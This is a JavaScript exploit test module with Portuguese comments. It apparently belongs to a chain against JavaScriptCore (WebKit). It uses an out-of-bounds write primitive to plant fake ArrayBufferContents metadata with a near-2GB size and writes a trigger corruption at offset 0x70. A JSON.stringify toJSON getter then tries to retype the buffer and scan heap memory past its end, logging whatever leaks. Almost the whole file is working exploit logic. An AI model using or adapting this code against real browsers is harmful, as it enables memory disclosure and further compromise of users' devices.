// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs (Mantendo a estrutura do último teste bem-sucedido em termos de logs)
// Foco: Usar o getter para tentar uma leitura OOB com um TypedArray sobre o oob_array_buffer_real,
// após plantar metadados sombra com tamanho gigante.
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForFinalLengthRetypeAttempt";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "", oob_reads: [] };

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA = 0x200; // Offset seguro dentro de oob_ab para plantar metadados
const FAKE_AB_HUGE_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); // Quase 2GB
// Para este teste, o data_pointer dos metadados sombra apontará para o início do oob_array_buffer_real.
// Se oob_array_buffer_real for re-tipado com este tamanho e ponteiro, um TypedArray sobre ele
// terá um data_pointer = &oob_array_buffer_real[0] e length = FAKE_AB_HUGE_SIZE/element_size.
const FAKE_AB_DATA_POINTER = new AdvancedInt64(0x0, 0x0); // Aponta para o início do oob_ab_data

class CheckpointForFinalAttempt {
    constructor(id) {
        this.id_marker = `FinalAttemptCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "FinalLengthRetype_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        current_test_results = { success: false, message: "Getter chamado, tentando re-tipagem final de length.", error: null, details: "", oob_reads: [] };
        let details_log = [];

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute || !JSC_OFFSETS.ArrayBufferContents) {
                throw new Error("Primitivas OOB, oob_array_buffer_real ou Offsets não disponíveis.");
            }

            // 1. Re-plantar os metadados sombra (tamanho gigante) DENTRO do getter.
            //    Local: FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA
            //    Estes são os ArrayBufferContents que queremos que o oob_array_buffer_real use.
            logS3(`DENTRO DO GETTER: Re-plantando metadados sombra (size=${FAKE_AB_HUGE_SIZE.toString(true)}, data_ptr=${FAKE_AB_DATA_POINTER.toString(true)}) em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA)}]...`, "info", FNAME_GETTER);
            oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
            oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER, 8);
            details_log.push(`Metadados sombra re-plantados em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA)}].`);

            // 2. Tentar corromper o m_impl (CONTENTS_IMPL_POINTER_OFFSET) do *próprio oob_array_buffer_real*
            //    para apontar para os metadados sombra que acabamos de plantar.
            //    Isso requer saber o endereço do objeto JS oob_array_buffer_real, o que não temos.
            //    A escrita OOB em 0x70 é no *buffer de dados*.
            //    Se 0x70 *fosse* o m_impl do objeto JS oob_array_buffer_real, teríamos sucesso.
            //    Como os testes anteriores mostraram que oob_array_buffer_real.byteLength não muda,
            //    a escrita em 0x70 provavelmente não está atingindo seu próprio m_impl.

            //    Vamos prosseguir com a criação do Uint32Array sobre o oob_array_buffer_real,
            //    esperando que a combinação da escrita em 0x70 (externa) E os metadados sombra
            //    plantados no início do seu *próprio buffer* (interno) causem a re-tipagem.
            logS3("DENTRO DO GETTER: Tentando 'new Uint32Array(oob_array_buffer_real)' para usar metadados sombra...", "info", FNAME_GETTER);
            const large_reader = new Uint32Array(oob_array_buffer_real); // Usa o oob_array_buffer_real que teve seu conteúdo modificado
            
            details_log.push(`Uint32Array criado. Length reportado: ${large_reader.length}. oob_ab.byteLength original: ${oob_array_buffer_real.byteLength}.`);
            logS3(`DENTRO DO GETTER: large_reader.length: ${large_reader.length} (Esperado com re-tipagem: ${FAKE_AB_HUGE_SIZE.low() / 4})`, "info", FNAME_GETTER);

            if (large_reader.length * 4 === FAKE_AB_HUGE_SIZE.low() && FAKE_AB_HUGE_SIZE.low() > oob_array_buffer_real.byteLength) {
                current_test_results.success = true;
                current_test_results.message = `SUCESSO! oob_array_buffer_real RE-TIPADO para tamanho GIGANTE! Length do Uint32Array: ${large_reader.length}.`;
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
                details_log.push(current_test_results.message);

                // Tentar ler um pouco além do limite original para confirmar OOB read no heap
                const original_oob_ab_actual_len_u32 = oob_array_buffer_real.byteLength / 4;
                const oob_read_idx_start = original_oob_ab_actual_len_u32 + 1; // Começa a ler logo após o fim original
                const oob_read_idx_end = Math.min(large_reader.length, oob_read_idx_start + 256); // Ler até 256 dwords OOB

                logS3(`Varrendo com large_reader de índice ${oob_read_idx_start} até ${oob_read_idx_end -1}...`, "info", FNAME_GETTER);
                for (let i = oob_read_idx_start; i < oob_read_idx_end; i++) {
                    try {
                        const val = large_reader[i];
                        if (val !== 0 && val !== undefined) { // Logar apenas valores não-zero/definidos
                            let leak_info = `Leitura OOB: large_reader[${i}] (${toHex(i*4)}) = ${toHex(val)}`;
                            logS3(leak_info, "leak", FNAME_GETTER);
                            current_test_results.oob_reads.push(leak_info);
                        }
                    } catch (e_scan) { 
                        details_log.push(`Erro na leitura OOB em índice ${i}: ${e_scan.message}`);
                        logS3(`Erro na leitura OOB em large_reader[${i}]: ${e_scan.message}`, "error", FNAME_GETTER);
                        // Parar de ler se um erro ocorrer, pois pode ser um crash real
                        break;
                    }
                }
                if (current_test_results.oob_reads.length > 0) {
                    details_log.push(`${current_test_results.oob_reads.length} leituras OOB realizadas.`);
                } else {
                    details_log.push("Nenhum dado OOB lido (ou todos eram zero).");
                }

            } else {
                current_test_results.message = `Falha na re-tipagem de length. Length do Uint32Array: ${large_reader.length}, esperado (sombra): ${FAKE_AB_HUGE_SIZE.low() / 4}.`;
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "warn", FNAME_GETTER);
            }

        } catch (e) {
            logS3(`DENTRO DO GETTER: ERRO GERAL: ${e.message}`, "error", FNAME_GETTER);
            current_test_results.error = String(e);
            current_test_results.message = `Erro geral no getter: ${e.message}`;
        }
        current_test_results.details = details_log.join('; ');
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForFinalAttempt.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_final_retype_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeFinalLengthRetypeAttempt"; // Nome interno
    logS3(`--- Iniciando Tentativa Final de Re-Tipagem de Length no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "", oob_reads: [] };

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        /* ... validação ... */ return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Plantar "Metadados Sombra" com tamanho GIGANTE no local FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA
        //    Isso é feito ANTES da escrita gatilho.
        logS3(`Plantando metadados sombra (size=${FAKE_AB_HUGE_SIZE.toString(true)}, data_ptr=${FAKE_AB_DATA_POINTER.toString(true)}) em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA)}]...`, "info", FNAME_TEST);
        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER, 8);
        
        // 2. Realizar a escrita OOB "gatilho"
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} do oob_data completada.`, "info", FNAME_TEST);

        // 3. Criar o objeto Checkpoint e chamar JSON.stringify
        const checkpoint_obj = new CheckpointForFinalAttempt(1);
        logS3(`CheckpointForFinalAttempt objeto criado. ID: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... erro ... */ }

    } catch (mainError) { /* ... erro principal ... */ }
    finally { /* ... limpeza ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TENTATIVA FINAL RE-TIPAGEM: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TENTATIVA FINAL RE-TIPAGEM: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST);
        if (current_test_results.oob_reads && current_test_results.oob_reads.length > 0) {
            logS3("Dados Lidos OOB (se houver):", "leak", FNAME_TEST);
            current_test_results.oob_reads.forEach(leak_info => {
                logS3(`  ${leak_info}`, "leak", FNAME_TEST);
            });
        }
    } else {
        logS3("RESULTADO TENTATIVA FINAL RE-TIPAGEM: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Tentativa Final de Re-Tipagem de Length no Getter Concluída ---`, "test", FNAME_TEST);
}
